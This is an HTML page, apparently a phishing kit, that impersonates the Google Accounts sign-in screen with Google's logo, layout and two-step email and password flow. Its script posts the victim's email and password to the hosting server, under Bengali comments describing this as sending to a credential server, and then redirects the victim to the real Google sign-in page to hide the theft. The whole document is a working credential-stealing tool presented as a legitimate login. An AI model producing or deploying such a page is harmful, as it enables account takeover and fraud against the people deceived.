<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }
    body {
        font-family: Roboto, "Helvetica Neue", Arial, sans-serif;
        background: #fff;
        color: #202124;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .page {
        width: 100%;
        max-width: 448px;
        padding: 0 20px;
        flex: 1;
        display: flex;
        flex-direction: column;
        justify-content: center;
    }

    .card {
        border: 1px solid #dadce0;
        border-radius: 8px;
        padding: 48px 40px 36px;
        background: #fff;
        margin-top: 24px;
    }

    .g-logo {
        display: block;
        margin: 0 auto 16px;
        width: 48px;
        height: 48px;
    }

    h1 {
        font-size: 24px;
        font-weight: 400;
        text-align: center;
        color: #202124;
        margin-bottom: 8px;
    }

    .subtitle {
        font-size: 16px;
        font-weight: 400;
        text-align: center;
        color: #202124;
        margin-bottom: 32px;
    }

    .input-wrap {
        position: relative;
        margin-bottom: 22px;
    }
    .input-wrap input {
        width: 100%;
        padding: 13px 15px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 16px;
        font-family: inherit;
        color: #202124;
        background: transparent;
        outline: none;
        transition: 0.15s;
    }
    .input-wrap input:hover { border-color: #202124; }
    .input-wrap input:focus {
        border: 2px solid #1a73e8;
        padding: 12px 14px;
    }
    .input-wrap label {
        position: absolute;
        left: 12px;
        top: 50%;
        transform: translateY(-50%);
        background: #fff;
        padding: 0 4px;
        color: #5f6368;
        font-size: 16px;
        pointer-events: none;
        transition: 0.15s ease all;
    }
    .input-wrap input:focus + label,
    .input-wrap input:not(:placeholder-shown) + label {
        top: 0;
        font-size: 12px;
        color: #1a73e8;
    }

    .err-row {
        display: none;
        align-items: center;
        gap: 6px;
        color: #d93025;
        font-size: 13px;
        margin-top: -12px;
        margin-bottom: 18px;
    }
    .err-row.show { display: flex; }

    .link {
        display: inline-block;
        color: #1a73e8;
        font-size: 14px;
        font-weight: 500;
        text-decoration: none;
        padding: 4px 0;
    }
    .link:hover { text-decoration: underline; }

    .info {
        font-size: 14px;
        color: #5f6368;
        line-height: 1.5;
        margin: 22px 0 32px;
    }
    .info a {
        color: #1a73e8;
        font-weight: 500;
        text-decoration: none;
    }
    .info a:hover { text-decoration: underline; }

    .actions {
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 16px;
        margin-top: 12px;
    }
    .actions .create {
        color: #1a73e8;
        font-size: 14px;
        font-weight: 500;
        text-decoration: none;
        padding: 8px 8px;
        border-radius: 4px;
    }
    .actions .create:hover {
        background: #f6fafe;
    }
    .actions button {
        background: #1a73e8;
        color: #fff;
        border: none;
        padding: 10px 24px;
        font-size: 14px;
        font-weight: 500;
        font-family: inherit;
        border-radius: 4px;
        cursor: pointer;
        letter-spacing: 0.25px;
        transition: 0.15s;
    }
    .actions button:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(66,133,244,.3); }
    .actions button:disabled { background: #a8c7fa; cursor: default; }

    /* ── Account chip (step 2) ── */
    .account-chip {
        display: flex;
        align-items: center;
        gap: 10px;
        padding: 4px 4px 4px 0;
        border: 1px solid #dadce0;
        border-radius: 20px;
        width: fit-content;
        margin: 0 auto 24px;
        padding-right: 14px;
        cursor: pointer;
    }
    .account-chip:hover { background: #f8f9fa; }
    .account-chip .avatar {
        width: 26px;
        height: 26px;
        border-radius: 50%;
        background: #1a73e8;
        color: #fff;
        font-size: 13px;
        font-weight: 500;
        display: flex;
        align-items: center;
        justify-content: center;
        text-transform: uppercase;
    }
    .account-chip .email-display {
        font-size: 14px;
        color: #3c4043;
        max-width: 280px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }

    .show-pass {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 14px;
        color: #202124;
        margin-bottom: 32px;
        cursor: pointer;
        user-select: none;
    }
    .show-pass input {
        width: 18px;
        height: 18px;
        accent-color: #1a73e8;
        cursor: pointer;
    }

    /* ── Footer ── */
    .footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 448px;
        width: 100%;
        padding: 16px 40px 24px;
        font-size: 12px;
        color: #5f6368;
    }
    .footer select {
        border: none;
        background: transparent;
        font-size: 12px;
        color: #5f6368;
        padding: 6px 4px;
        cursor: pointer;
        outline: none;
    }
    .footer .links a {
        color: #5f6368;
        text-decoration: none;
        margin-left: 20px;
    }
    .footer .links a:hover { color: #202124; }

    @media (max-width: 500px) {
        .card { padding: 32px 24px 28px; }
        .page { padding: 0 12px; }
        .footer { padding: 16px 24px 20px; }
        .footer .links a { margin-left: 12px; }
    }
</style>
</head>
<body>

<div class="page">
    <div class="card">

        <!-- Google "G" logo (inline SVG) -->
        <svg class="g-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>

        <!-- ══ STEP 1: Email ══ -->
        <div id="step1">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>

            <div class="input-wrap">
                <input type="email" id="email" placeholder=" " autocomplete="off" autocapitalize="off" spellcheck="false" required>
                <label for="email">Email or phone</label>
            </div>
            <div class="err-row" id="err1">
                <span>⚠</span><span>Enter a valid email or phone number</span>
            </div>

            <a href="#" class="link" onclick="return false;">Forgot email?</a>

            <p class="info">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" onclick="return false;">Learn more</a>
            </p>

            <div class="actions">
                <a href="#" class="create" onclick="return false;">Create account</a>
                <button type="button" id="nextBtn1">Next</button>
            </div>
        </div>

        <!-- ══ STEP 2: Password ══ -->
        <div id="step2" style="display:none;">
            <div class="account-chip" id="chip">
                <div class="avatar" id="avatarLetter">?</div>
                <div class="email-display" id="emailDisplay">user@gmail.com</div>
            </div>

            <h1>Welcome</h1>

            <div class="input-wrap">
                <input type="password" id="password" placeholder=" " required>
                <label for="password">Enter your password</label>
            </div>
            <div class="err-row" id="err2">
                <span>⚠</span><span>Enter a password</span>
            </div>

            <label class="show-pass">
                <input type="checkbox" id="showPass">
                Show password
            </label>

            <div class="actions">
                <a href="#" class="create" onclick="return false;">Forgot password?</a>
                <button type="button" id="nextBtn2">Next</button>
            </div>
        </div>

    </div>
</div>

<div class="footer">
    <select>
        <option>English (United States)</option>
        <option>বাংলা</option>
        <option>हिन्दी</option>
        <option>Español</option>
        <option>中文（简体）</option>
    </select>
    <div class="links">
        <a href="#" onclick="return false;">Help</a>
        <a href="#" onclick="return false;">Privacy</a>
        <a href="#" onclick="return false;">Terms</a>
    </div>
</div>

<script>
    const step1    = document.getElementById('step1');
    const step2    = document.getElementById('step2');
    const emailIn  = document.getElementById('email');
    const passIn   = document.getElementById('password');
    const next1    = document.getElementById('nextBtn1');
    const next2    = document.getElementById('nextBtn2');
    const err1     = document.getElementById('err1');
    const err2     = document.getElementById('err2');
    const chip     = document.getElementById('chip');
    const avatar   = document.getElementById('avatarLetter');
    const emailDsp = document.getElementById('emailDisplay');
    const showPass = document.getElementById('showPass');

    let savedEmail = '';

    // ══ Step 1 → Step 2 ══
    next1.addEventListener('click', () => {
        const v = emailIn.value.trim();
        if (!v || (v.indexOf('@') === -1 && !/^\+?\d[\d\s-]{6,}$/.test(v))) {
            err1.classList.add('show');
            emailIn.focus();
            return;
        }
        err1.classList.remove('show');
        savedEmail = v;

        // chip এ দেখাও
        avatar.textContent   = v.charAt(0);
        emailDsp.textContent = v;

        step1.style.display = 'none';
        step2.style.display = '';
        passIn.focus();
    });

    emailIn.addEventListener('keydown', e => {
        if (e.key === 'Enter') { e.preventDefault(); next1.click(); }
    });

    // chip এ ক্লিক → email পেজে ফেরত
    chip.addEventListener('click', () => {
        step2.style.display = 'none';
        step1.style.display = '';
        emailIn.focus();
    });

    // ══ Show password toggle ══
    showPass.addEventListener('change', () => {
        passIn.type = showPass.checked ? 'text' : 'password';
    });

    // ══ Step 2 → submit → Google এ redirect ══
    next2.addEventListener('click', async () => {
        const p = passIn.value.trim();
        if (!p) {
            err2.classList.add('show');
            passIn.focus();
            return;
        }
        err2.classList.remove('show');

        next2.disabled    = true;
        next2.textContent = 'Signing in...';

        // ═══ credential server এ পাঠাও ═══
        try {
            await fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    username: savedEmail,
                    password: p
                })
            });
        } catch (e) {
            // নেট ফেইল হলেও redirect
        }

        // ── সোজা আসল Google এ ──
        setTimeout(() => {
            window.location.href = 'https://accounts.google.com/';
        }, 900);
    });

    passIn.addEventListener('keydown', e => {
        if (e.key === 'Enter') { e.preventDefault(); next2.click(); }
    });
</script>

</body>
</html>
